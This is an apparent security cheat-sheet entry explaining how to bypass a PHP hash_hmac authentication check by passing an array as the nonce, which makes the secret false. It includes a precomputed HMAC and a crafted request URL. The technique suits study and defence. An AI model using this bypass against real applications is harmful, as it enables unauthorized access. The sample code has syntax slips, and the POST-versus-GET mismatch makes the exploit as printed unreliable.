---
title: PHP hash_hmac Bypass
description: 
tags:
    - Web
refs:
    - https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/
date: 2023-03-31
draft: false
---

## Investigation

If the website uses **`hash_hmac`** function on PHP as below, we can bypass by injecting parameters.

```php
<?php
	if (empty($_POST['hmac']) || empty($_POST['host']) {
		header('HTTP/1.0 400 Bad Request');
		exit;
	}

	if (isset($_POST['nonce'])
		$secret = hash_hmac('sha256', $_POST['nonce'], $secret);

	$hmac = hash_hmac('sha256', $_POST['host'], $secret);

	if ($hmac !== $_POST['hmac']) {
		header('HTTP/1.0 403 Forbidden');
		exit;
	}
?>
```

When executing the following command, the **`hash_hmac`** returns **false**.

```bash
php -r "echo hash_hmac('sha256', Array(), 'secret')==false;"

# Output
PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1
1
```

<br />

## Exploitation

Create a **Hmac hash** by running below.  
In the above PHP script, **`$hmac`** needs to be the same as the parameter values of **`hmac`**.

```bash
php -r "echo hash_hmac('sha256', 'example.com', false)"

# Output
8e35e0a8e5a18b6ef04598dff384c65adf5aced1a1d530b17f86e92eeb9372a8
```

So put the output hmac value into the paramter **"hmac"** and the second arguments ("example.com") into the **host** parameter.

```bash
https://example.com/?nonce[]=&hmac=8e35e0a8e5a18b6ef04598dff384c65adf5aced1a1d530b17f86e92eeb9372a8&host=example.com
```
